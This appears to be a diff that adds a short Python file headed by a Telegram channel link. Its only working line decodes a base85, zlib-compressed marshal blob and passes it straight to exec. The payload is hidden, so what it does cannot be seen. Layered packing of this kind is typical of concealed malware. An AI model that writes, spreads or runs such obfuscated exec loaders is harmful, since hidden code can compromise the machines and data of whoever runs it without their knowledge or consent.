@@ -1,0 +1,3 @@
+#https://t.me/V6V_V
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b85decode(b'c${65T~8B16o${tY^7*54G>60O%eH6zJjPISP@h2NC=4u7frY*ok?jZEzE8s)$LXNCEod$=GLqE7oK;+ZVXM%lXuR0_VmohU%K}TI1V|YWrij#eo=#r&~hvq(kMf1((1P`a?BY)I`~Fmp(XEinB=IV%K^HGk&G!835~^Ae5JG1kxFDN6G~KtVwH$QvCG~pRk-F0$9o#dn{pz#yF7Lj2CiV6y|!_xYkE$#F0501tHYq7nwIsY88#-hY1!d*Y_t=dKV*yi-%jebo47MDWrQq=K$OL@un$@PC{<6IQS_bLRrjmmsej2yzX5y%wtxko26TWu;1#eByajd{_A%5a-~(_3;0*j5;4^Rm#K0xKm<OI<xeegh{U&lVz%wj&0D~pQu(LoJxhBvB!o2t$u$a#h0UGG#xhm9V*2R{96&S0)63|BubsmPD2G+B2{aQALPoSOx=>|toaD6&UT8y{gU%*Ju^c-qC8#nFj*Yh3Kv(vCsxq1ZSC)8ZF1^XI!&NvQ(^cG#A)4LwT_5pNYZu!P>)Bgc;xMJ<9uLoUokiG>x)#5}^`~xR$lt%'))))
